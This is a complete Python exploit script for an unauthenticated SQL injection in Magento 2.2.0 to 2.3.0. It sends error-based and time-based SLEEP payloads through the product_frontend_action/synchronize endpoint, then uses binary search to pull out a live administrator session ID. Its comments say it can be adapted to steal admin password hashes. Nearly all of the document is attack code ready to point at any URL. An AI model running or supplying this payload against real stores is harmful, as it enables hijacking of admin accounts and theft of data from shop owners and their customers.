# Magento 2.2.0 <= 2.3.0 Unauthenticated SQLi
# Charles Fol
#
# SOURCE & SINK
# The source (/catalog/product_frontend_action/synchronize) from 2.2.0.
# If your target runs Magento < 2.2.0, you need to find another source.
#
# SQL INJECTION
# The exploit can easily be modified to obtain other stuff from the DB, for
# instance admin/user password hashes.
#

import requests
import string
import binascii
import re
import random
import time
import sys
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def run(url):
    sqli = SQLInjection(url)

    try:
        sqli.find_test_method()
        sid = sqli.get_most_recent_session()
    except ExploitError as e:
        print(&#039;Error: %s&#039; % e)


def random_string(n=8):
    return &#039;&#039;.join(random.choice(string.ascii_letters) for _ in range(n))


class ExploitError(Exception):
    pass


class Browser:
    """Basic browser functionality along w/ URLs and payloads.
    """
    PROXY = None

    def __init__(self, URL):
        self.URL = URL
        self.s = requests.Session()
        self.s.verify = False
        if self.PROXY:
            self.s.proxies = {
                &#039;http&#039;: self.PROXY,
                &#039;https&#039;: self.PROXY,
            }


class SQLInjection(Browser):
    """SQL injection stuff.
    """

    def encode(self, string):
        return &#039;0x&#039; + binascii.b2a_hex(string.encode()).decode()

    def find_test_method(self):
        """Tries to inject using an error-based technique, or falls back to timebased.
        """
        for test_method in (self.test_error, self.test_timebased):
            if test_method(&#039;123=123&#039;) and not test_method(&#039;123=124&#039;):
                self.test = test_method
                break
        else:
            raise ExploitError(&#039;Test SQL injections failed, not vulnerable ?&#039;)

    def test_timebased(self, condition):
        """Runs a test. A valid condition results in a sleep of 1 second.
        """
        payload = &#039;))) OR (SELECT*FROM (SELECT SLEEP((%s)))a)=1 -- -&#039; % condition
        r = self.s.get(
            self.URL + &#039;/catalog/product_frontend_action/synchronize&#039;,
            params={
                &#039;type_id&#039;: &#039;recently_products&#039;,
                &#039;ids[0][added_at]&#039;: &#039;&#039;,
                &#039;ids[0][product_id][from]&#039;: &#039;?&#039;,
                &#039;ids[0][product_id][to]&#039;: payload
            }
        )
        return r.elapsed.total_seconds() > 1

    def test_error(self, condition):
        """Runs a test. An invalid condition results in an SQL error.
        """
        payload = &#039;))) OR (SELECT 1 UNION SELECT 2 FROM DUAL WHERE %s) -- -&#039; % condition
        r = self.s.get(
            self.URL + &#039;/catalog/product_frontend_action/synchronize&#039;,
            params={
                &#039;type_id&#039;: &#039;recently_products&#039;,
                &#039;ids[0][added_at]&#039;: &#039;&#039;,
                &#039;ids[0][product_id][from]&#039;: &#039;?&#039;,
                &#039;ids[0][product_id][to]&#039;: payload
            }
        )
        if r.status_code not in (200, 400):
            raise ExploitError(
                &#039;SQL injection does not yield a correct HTTP response&#039;
            )
        return r.status_code == 400

    def word(self, name, sql, size=None, charset=None):
        """Dichotomically obtains a value.
        """
        pattern = &#039;LOCATE(SUBSTR((%s),%d,1),BINARY %s)=0&#039;
        full = &#039;&#039;

        check = False
        
        if size is None:
            # Yeah whatever
            size_size = self.word(
                name,
                &#039;LENGTH(LENGTH(%s))&#039; % sql,
                size=1,
                charset=string.digits
            )
            size = self.word(
                name,
                &#039;LENGTH(%s)&#039; % sql,
                size=int(size_size),
                charset=string.digits
            )
            size = int(size)

        print("%s: %s" % (name, full), end=&#039;\r&#039;)

        for p in range(size):
            c = charset
            
            while len(c) > 1:
                middle = len(c) // 2
                h0, h1 = c[:middle], c[middle:]
                condition = pattern % (sql, p+1, self.encode(h0))
                c = h1 if self.test(condition) else h0

            full += c
            print("%s: %s" % (name, full), end=&#039;\r&#039;)

        print(&#039; &#039; * len("%s: %s" % (name, full)), end=&#039;\r&#039;)

        return full

    def get_most_recent_session(self):
        """Grabs the last created session. We don&#039;t need special privileges aside from creating a product so any session
        should do. Otherwise, the process can be improved by grabbing each session one by one and trying to reach the
        backend.
        """
        # This is the default admin session timeout
        session_timeout = 900
        query = (
            &#039;SELECT %%s FROM admin_user_session &#039;
            &#039;WHERE TIMESTAMPDIFF(SECOND, updated_at, NOW()) BETWEEN 0 AND %d &#039;
            &#039;ORDER BY created_at DESC, updated_at DESC LIMIT 1&#039;
        ) % session_timeout

        # Check if a session is available

        available = not self.test(&#039;(%s)=0&#039; % (query % &#039;COUNT(*)&#039;))
        
        if not available:
            raise ExploitError(&#039;No session is available&#039;)
        print(&#039;An admin session is available !&#039;)

        # Fetch it

        sid = self.word(
            &#039;Session ID&#039;,
            query % &#039;session_id&#039;,
            charset=string.ascii_lowercase + string.digits,
            size=26
        )
        print(&#039;Session ID: %s&#039; % sid)
        return sid

run(sys.argv[1])

